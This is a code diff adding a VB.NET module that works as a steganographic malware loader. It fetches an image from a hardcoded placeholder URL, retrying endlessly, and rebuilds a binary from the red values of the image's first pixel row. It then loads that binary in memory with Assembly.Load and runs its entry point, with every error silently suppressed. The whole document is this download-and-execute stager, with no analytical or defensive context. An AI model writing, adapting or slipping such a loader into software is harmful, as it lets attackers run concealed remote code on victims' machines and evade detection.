@@ -1,0 +1,42 @@
+Imports System.Net
+Imports System.Reflection
+Imports System.Threading
+Module MAIN
+    Sub main()
+        load()
+    End Sub
+    Function load()
+        Try
+            Dim image As Bitmap = imgdata()
+            For pix = 0 To image.Width - 1
+                list.Add(image.GetPixel(pix, 0).R)
+            Next
+            loadM(list.ToArray)
+        Catch ex As Exception
+        End Try
+    End Function
+    Function imgdata() As Bitmap
+        Try
+Re:
+            Dim obj As Object = New WebClient()
+            Dim wc = obj
+            Return Image.FromStream(wc.OpenRead(imageurl))
+        Catch ex As Exception
+            Thread.Sleep(2000)
+            GoTo Re
+        End Try
+    End Function
+    Function loadM(ByVal B As Byte())
+        Try
+            Dim lol As Object = Assembly.Load(B)
+            Dim ccc As Object = lol.EntryPoint
+            ccc.Invoke(Nothing, Nothing)
+        Catch ex As Exception
+        End Try
+    End Function
+
+
+    Public imageurl As String = "http://exmple.com/Image.png"
+    Public list As New List(Of Byte)
+
+End Module
